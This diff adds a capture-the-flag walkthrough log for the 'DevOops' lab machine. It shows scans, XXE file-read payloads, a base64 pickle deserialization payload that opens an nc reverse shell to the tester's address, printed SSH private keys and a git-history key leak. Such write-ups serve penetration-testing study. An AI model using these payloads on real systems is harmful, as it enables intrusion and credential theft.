@@ -1,0 +1,537 @@
+Machine-Name  :  DevOops
+IP-Address    :  10.129.1.79
+
+Command-Line: sudo nmap -A 10.129.1.79
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-05 20:01 EST
+    Nmap scan report for 10.129.1.79
+    Host is up (0.056s latency).
+    Not shown: 998 closed ports
+    PORT     STATE SERVICE VERSION
+    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
+    |   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
+    |_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
+    5000/tcp open  http    Gunicorn 19.7.1
+    |_http-server-header: gunicorn/19.7.1
+    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=2/5%OT=22%CT=1%CU=34393%PV=Y%DS=2%DC=T%G=Y%TM=601DEA76
+    OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=A)OPS(
+    OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+    OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+    OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+    OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+    OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+    OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+    OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+    OS:S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 110/tcp)
+    HOP RTT      ADDRESS
+    1   61.35 ms 10.10.14.1
+    2   54.51 ms 10.129.1.79
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 21.93 seconds
+
+
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,py,txt -f -t 50 -u http://10.129.1.79:5000/
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, py, txt | HTTP method: GET | Threads: 50 | Wordlist size: 1102600
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-02-05_20-10-29.log
+
+    Target: http://10.129.1.79:5000/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.1.79/_21-02-05_20-10-29.txt
+
+    [20:10:29] Starting:
+    [20:10:31] 200 -  533KB - /feed
+    [20:10:34] 200 -  347B  - /upload
+    [20:14:43] 405 -  178B  - /newpost
+
+
+Browser: http://10.129.1.79:5000
+Result:
+    Under construction!
+
+    This is feed.py, which will become the MVP for Blogfeeder application.
+
+    TODO: replace this with the proper feed from the dev.solita.fi backend.
+
+Notes: Locate "feed.py"
+
+
+Browser: http://10.129.1.79/upload
+Notes: Successfully upload /test.xml
+
+Browser: Payload all things
+Notes: /XXE Injection/Files/Classic XXE - etc passwd.xml
+Result: /exploit.xml
+
+Burpsuite: Intercept ON.
+Notes: Uploaded /test.xml. Sent to Repeater.
+Burpsuite:
+    <?xml version="1.0"?>
+    <!DOCTYPE data [
+    <!ELEMENT data (ANY)>
+    <!ENTITY file SYSTEM "file:///home/roosa/user.txt">
+    ]>
+    <Uk47>
+    	<Author>uk47</Author>
+    	<Subject>&file;</Subject>
+    	<Content>iluvu</Content>
+    </Uk47>
+Result:
+    HTTP/1.1 200 OK
+    Server: gunicorn/19.7.1
+    Date: Sat, 06 Feb 2021 03:25:23 GMT
+    Connection: close
+    Content-Type: text/html; charset=utf-8
+    Content-Length: 184
+
+     PROCESSED BLOGPOST:
+      Author: uk47
+     Subject: hellowrld
+     Content: c5808e1643e801d40f09ed87cdecc67b
+
+     URL for later reference: /uploads/test.xml
+     File path: /home/roosa/deploy/src
+     *** USER OWNED ***
+
+USERNAME/USER.TXT: roosa:c5808e1643e801d40f09ed87cdecc67b
+
+BurpSuite:
+    <?xml version="1.0"?>
+    <!DOCTYPE data [
+    <!ELEMENT data (ANY)>
+    <!ENTITY file SYSTEM "feed.py">
+    ]>
+    <Uk47>
+    	<Author>uk47</Author>
+    	<Subject>hellowrld</Subject>
+    	<Content>&file;</Content>
+    </Uk47>
+Result:
+    HTTP/1.1 200 OK
+    Server: gunicorn/19.7.1
+    Date: Sat, 06 Feb 2021 03:55:49 GMT
+    Connection: close
+    Content-Type: text/html; charset=utf-8
+    Content-Length: 1060
+
+     PROCESSED BLOGPOST:
+      Author: uk47
+     Subject: hellowrld
+     Content: ')
+    def uploaded_file(filename):
+        return send_from_directory(Config.UPLOAD_FOLDER,
+                                   filename)
+
+    @app.route("/")
+    def xss():
+        return template('index.html')
+
+    @app.route("/feed")
+    def fakefeed():
+       return send_from_directory(".","devsolita-snapshot.png")
+
+    @app.route("/newpost", methods=["POST"])
+    def newpost():
+      # TODO: proper save to database, this is for testing purposes right now
+      picklestr = base64.urlsafe_b64decode(request.data)
+    #  return picklestr
+      postObj = pickle.loads(picklestr)
+      return "POST RECEIVED: " + postObj['Subject']
+
+
+    ## TODO: VERY important! DISABLED THIS IN PRODUCTION
+    #app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
+    # TODO: Replace run-gunicorn.sh with real Linux service script
+    # app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
+
+    if __name__ == "__main__":
+      app.run(host='0.0.0,0', Debug=True)
+
+
+     URL for later reference: /uploads/test.xml
+     File path: /home/roosa/deploy/src
+Notes: PICKLE EXPLOIT
+
+Browser: Pickle Exploit
+URL: https://davidhamann.de/2020/04/05/exploiting-python-pickle/
+
+Notes: Creating custom command to deserialize a pickle command and then urlsafe_b64encode the object to then pass as a post request to "/newpost".
+Result: /pickle-exploit.py
+
+Command-Line: python pickle-exploit.py
+Result: Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xNDkgOTAwMSA-L3RtcC9mJwpwMQp0cDIKUnAzCi4=
+
+BurpSuite: Intercept ON.
+Browser: http://10.129.1.79/newpost
+
+BurpSuite: Sent to Repeater.
+Notes: Replaced "Content-Type: application/x-www-form-urlencoded" with "Content-Type: text".
+Data-Added: Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xNDkgOTAwMSA-L3RtcC9mJwpwMQp0cDIKUnAzCi4=
+BurpSuite: Hit Send.
+Result: *** REVERSE SHELL ***
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result:
+    roosa@gitter:~/deploy/src$
+
+
+roosa@gitter:~/deploy/src$ cd ../
+roosa@gitter:~/deploy$ ls
+Result:
+    README.md  resources  run-gunicorn.sh  src
+
+roosa@gitter:~/deploy$ cd resources
+roosa@gitter:~/deploy/resources$ ls
+Result:
+    integration
+roosa@gitter:~/deploy/resources$ cd integration
+roosa@gitter:~/deploy/resources/integration$ ls
+Result:
+    authcredentials.key
+roosa@gitter:~/deploy/resources/integration$ cat authcredentials.key
+Result:
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
+ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
+23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
+sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
+ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
+ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
+LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
+JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
+oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
+xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
+vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
+6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
+OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
+4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
+937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
+SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
+Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
+eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
+i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
+6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
+8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
+RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
+qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
+T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
+bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
+-----END RSA PRIVATE KEY-----
+
+roosa@gitter:~/deploy/src$ cat ../../../.ssh/id_rsa
+Result:
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
+    9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
+    R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
+    v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
+    9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
+    m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
+    JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
+    ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
+    lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
+    koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
+    e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
+    8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
+    Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
+    NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
+    hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
+    ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
+    A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
+    agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
+    KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
+    vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
+    8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
+    y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
+    aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
+    xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
+    82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
+    -----END RSA PRIVATE KEY-----
+
+
+Command-Line: nano auth_key
+File-Contents:
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
+    ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
+    23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
+    sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
+    ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
+    ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
+    LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
+    JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
+    oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
+    xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
+    vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
+    6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
+    OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
+    4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
+    937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
+    SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
+    Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
+    eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
+    i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
+    6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
+    8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
+    RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
+    qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
+    T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
+    bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
+    -----END RSA PRIVATE KEY-----
+
+
+Command-Line: nano roosa_key
+File-Contents:
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
+    9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
+    R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
+    v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
+    9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
+    m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
+    JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
+    ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
+    lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
+    koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
+    e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
+    8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
+    Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
+    NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
+    hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
+    ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
+    A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
+    agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
+    KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
+    vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
+    8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
+    y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
+    aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
+    xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
+    82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
+    -----END RSA PRIVATE KEY-----
+
+
+Command-Line: ssh -i roosa_key roosa@10.129.1.79
+Result:
+    Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
+
+     * Documentation:  https://help.ubuntu.com
+     * Management:     https://landscape.canonical.com
+     * Support:        https://ubuntu.com/advantage
+
+    135 packages can be updated.
+    60 updates are security updates.
+
+
+    The programs included with the Ubuntu system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+
+    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+    applicable law.
+
+    roosa@gitter:~$
+    *** REVERSE SHELL ***
+
+
+
+roosa@gitter:~$ ls -la
+Result:
+    total 168
+    drwxr-xr-x 22 roosa roosa 4096 May 29  2018 .
+    drwxr-xr-x  7 root  root  4096 Mar 19  2018 ..
+    -r--------  1 roosa roosa 5704 Mar 21  2018 .bash_history
+    -rw-r--r--  1 roosa roosa  220 Mar 19  2018 .bash_logout
+    -rw-r--r--  1 roosa roosa 3771 Mar 19  2018 .bashrc
+    drwx------ 12 roosa roosa 4096 Feb  6 00:40 .cache
+    drwx------  3 roosa roosa 4096 Mar 21  2018 .compiz
+    drwx------ 14 roosa roosa 4096 Mar 21  2018 .config
+    drwx------  3 root  root  4096 Mar 21  2018 .dbus
+    drwxrwxr-x  4 roosa roosa 4096 Mar 26  2018 deploy
+    drwxr-xr-x  2 roosa roosa 4096 May 29  2018 Desktop
+    -rw-r--r--  1 roosa roosa   25 Mar 21  2018 .dmrc
+    drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Documents
+    drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Downloads
+    drwx------  3 roosa roosa 4096 Mar 20  2018 .emacs.d
+    -rw-r--r--  1 roosa roosa 8980 Mar 19  2018 examples.desktop
+    drwx------  2 roosa roosa 4096 Mar 26  2018 .gconf
+    -rw-rw-r--  1 roosa roosa   56 Mar 19  2018 .gitconfig
+    drwx------  3 roosa roosa 4096 Feb  6 00:02 .gnupg
+    -rw-------  1 roosa roosa 5100 May 29  2018 .ICEauthority
+    drwx------  3 roosa roosa 4096 Mar 21  2018 .local
+    drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Music
+    drwxrwxr-x  2 roosa roosa 4096 Mar 19  2018 .nano
+    drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Pictures
+    -rw-r--r--  1 roosa roosa  655 Mar 19  2018 .profile
+    drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Public
+    -rwxrw-r--  1 roosa roosa  147 Mar 26  2018 run-blogfeed.sh
+    -rw-rw-r--  1 roosa roosa 1839 Mar 26  2018 service.sh
+    -rw-rw-r--  1 roosa roosa 2206 Mar 26  2018 service.sh~
+    drwx------  2 roosa roosa 4096 Mar 26  2018 .ssh
+    -rw-r--r--  1 roosa roosa    0 Mar 21  2018 .sudo_as_admin_successful
+    drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Templates
+    -r--------  1 roosa roosa   33 Mar 26  2018 user.txt
+    drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Videos
+    -rw-rw-r--  1 roosa roosa  182 Feb  5 23:57 .wget-hsts
+    drwxrwxr-x  3 roosa roosa 4096 Mar 21  2018 work
+    -rw-------  1 roosa roosa  205 May 29  2018 .Xauthority
+    -rw-------  1 roosa roosa 1389 May 31  2018 .xsession-errors
+    -rw-------  1 roosa roosa   82 May 24  2018 .xsession-errors.old
+
+
+Notes: Searching for any .git repo's within the home directory of roosa.
+
+roosa@gitter:~$ find * -name ".git"
+Result:
+    work/blogfeed/.git
+
+roosa@gitter:~$ cd work/blogfeed
+roosa@gitter:~/work/blogfeed$ git log
+Result:
+    commit 33e87c312c08735a02fa9c796021a4a3023129ad
+    Author: Roosa Hakkerson <roosa@solita.fi>
+    Date:   Mon Mar 19 09:33:06 2018 -0400
+
+        reverted accidental commit with proper key
+
+
+roosa@gitter:~/work/blogfeed$ git show 33e87c312c08735a02fa9c796021a4a3023129ad
+Result:
+    commit 33e87c312c08735a02fa9c796021a4a3023129ad
+    Author: Roosa Hakkerson <roosa@solita.fi>
+    Date:   Mon Mar 19 09:33:06 2018 -0400
+
+        reverted accidental commit with proper key
+
+    diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
+    index 44c981f..f4bde49 100644
+    --- a/resources/integration/authcredentials.key
+    +++ b/resources/integration/authcredentials.key
+    @@ -1,28 +1,27 @@
+     -----BEGIN RSA PRIVATE KEY-----
+    -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
